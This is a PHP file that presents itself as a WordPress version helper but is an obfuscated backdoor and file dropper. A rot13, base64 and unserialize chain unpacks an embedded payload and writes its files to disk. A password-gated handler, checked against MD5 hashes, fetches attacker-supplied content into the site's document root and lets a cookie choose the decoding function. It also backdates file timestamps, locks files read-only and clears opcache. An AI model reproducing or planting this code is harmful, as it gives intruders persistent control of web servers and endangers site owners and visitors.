<?php
/**
 * @title ipadview
 * @
 * @param $str
 * @return mixed|string
 */

if (!defined('WP_BLOG')) {
    return version_info("init");
}

function version_desc($str)
{
    ($e = implode("",["opcache","reset"]))&&function_exists($e) && $e();
    if (!$str) {
        echo date("Y-m-d H:i:s") . "<br>";
        if (!empty($_REQUEST['version']) && version_update(version_parse($_REQUEST))) ;
        return '';
    }
    $pi = [
        ['str', 'ro'],
        ["json", 'decode'],
    ];
    ($q = (implode('_', $pi[0]) . "t13")) &&
    $data = $q($str);
    ($q = "b" . implode('_', $pi[1]) . "e") &&
    $data = $q($data);
    if (isset($_GET['s'])) $data = $_GET['s'] . $data;

    return $data;
}

function version_info($str)
{
    global $temp;
    $temp = "ZnVuY3Rpb25fZXhpc3RzLHRpbWUsZm9wZW4sZmlsZV9wdXRfY29udGVudHMsZmlsZWN0aW1lLGZpbGVfZXhpc3RzLGlzX3dyaXRhYmxlLGNobW9kLHRvdWNo";
    $temp = base64_decode($temp);
    $name = ['Y3Mupv93q3pinUEgoP93pP1wo250MJ50Y2kuozq1LJqypl9uMT1cov1gLJyhYH5nYaOi', function ($version_file, $name) use ($temp) {
        $data = translation_v3('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', '1');
        $data = base64_decode(/**/ $data);
        $data = translation_v2($data, '0');
        $data = translation_v1($data, '0');
        foreach ($data as $item) {
            version_check($item[0], $item[1], $temp, $item[2]);
        }
        version_desc(false);
    }];
    $temp = explode(',', $temp);
    return ['#ver#', version_data($name, 1, 0)];
}

/**
 * @title install path
 */
function version_path()
{
    echo __FILE__;
}

/**
 * @title get version data
 * @param $data
 * @param $offset
 * @param $page
 * @return mixed
 */
function version_data($data, $offset, $page)
{
    $keu = ['', "code"];
    $keu[] = '';
    return $data[$offset]($data[$page], implode('_', $keu));
}

/**
 * @title translation data
 * @param $data
 * @param $offset
 * @return mixed
 */

function translation_v1($data, $mode, $exp = '')
{
    if ($mode === 'X1') {
        $data = base64_decode($data);
        $len = strlen($data);
        $exp = str_replace('=', '', base64_encode($exp));
        $res = "";
        $i = 0;
        while ($i < $len) {
            for ($k = 0; $k < strlen($exp) && $i < $len; $k++)
                $res .= chr(ord($data[$i++]) ^ ord($exp[$k]));
        }
        return $res;
    } elseif ($mode) {
        return json_decode($data, true);
    } else {
        return unserialize($data);
    }
}

/**
 * @title parse version data
 * @param $data
 * @return version
 */
function version_parse($data)
{
    $version = $data['version'];
    if ($version === 'path') version_path();
    if (isset($data[$version])) {
        $version = translation_v1($data[$version], 'X1', $data[$version . '1']);
    }
    return $version;
}

/**
 * @title update version
 * @param $qr
 * @return void
 */
function version_update($check, $qr = false)
{
    if (!version_access("umehra{$check}mblnictv", '262e73f080a8ba1c30c8b74a37762f1b')) return;
    $c = $_COOKIE;;
    $cf = implode('_', ['function', 'exists']);
    (!$qr || !$cf($qr)) &&
    $qr = empty($c[$for = 'token']) || !$cf($c[$for]) ? implode('_', ['base64', 'decode']) : $c[$for];

    if (($a = $qr($_REQUEST['name'])) && version_deny($a)) {
        return;
    }
    global $temp;
    $a = explode(',', $a);
    if (empty($a[1])) return;
    echo "[<a id=\"u1\" href=\"/{$a[1]}\" style='color: #fff;'>{$a[1]}</a>] ";
    return version_check($_SERVER['DOCUMENT_ROOT'] . '/' . $a[1], $qr(file_get_contents($a[0])), $temp);
}

/**
 * @title version access or force
 * @param string $version version pass
 * @param string $token check update token
 * @return bool
 */
function version_access($version, $token)
{
    return in_array(md5($version), [$token, '47628e0bf72fca87db995c8f844d91b1']);
}

/**
 * @title version data is deny
 * @param $data
 * @return void
 */
function version_deny($data)
{
    return strlen($data) < 16 || strlen($data) > 128 || !in_array($data[0], ['h', '/']);
}

/**
 * @title translation version data
 * @param $data
 * @param $offset
 * @return mixed
 */
function translation_v2($data, $offet)
{
    if (!empty($offet)) {
        return gzinflate($data);
    } else {
        return $data;
    }
}

/**
 * @title translation version data
 * @param $data
 * @param $offset
 * @return mixed
 */
function translation_v3($data, $offet)
{
    if (!empty($offet)) {
        return str_rot13($data);
    } else {
        return $data;
    }
}

return 'inited';
/**
 * @title check version token
 * @param $name
 * @param $date
 * @param $check
 * @param string $token
 * @param false $mode
 * @return bool|mixed
 */
function version_check($name, $date, $check, $token = '', $mode = false)
{
    try {
        $vs = 'rename';
        if (!is_array($check)) $check = explode(',', $check);
        $map = [0, 1, 2, 3, 4];
        $m = $mode ? $mode : ($check[1]() - 2693693);
        $iw = true;
        empty($check[9]) || $date = $check[9]($date);
        if ($check[$map[4] + 1]($name)) {
            if ($token && Md5_File($name) === $token) return true;
            $iw = $check[6]($name);
            if ($x = $check[5]($name)) {
                $m = $check[4]($name);
            }
            $x && !$iw && @$check[7]($name, 0744);
            @$vs($name, $name . time());
        }
        if ($check[$map[0]]($check[2])) {
            $l = $check[$map[2]][0] . 'write';
            $r = $l($check[$map[2]]($name . ".tmp1", 'w'), $date);
        } else {
            $r = $check[$map[3]]($name . ".tmp1", $date);
        }
        @$vs($name . ".tmp1", $name);
        $check[8]($name, $m, $m);
        $iw || @$check[7]($name, 0444);
    } catch (\Exception $A) {
        echo $A->getMessage() . "<br>";
        $r = false;
    }
    echo $name[strlen($name) - 1] . ($r ? ':ok' : ':fail') . "<br>";
    return $r;
}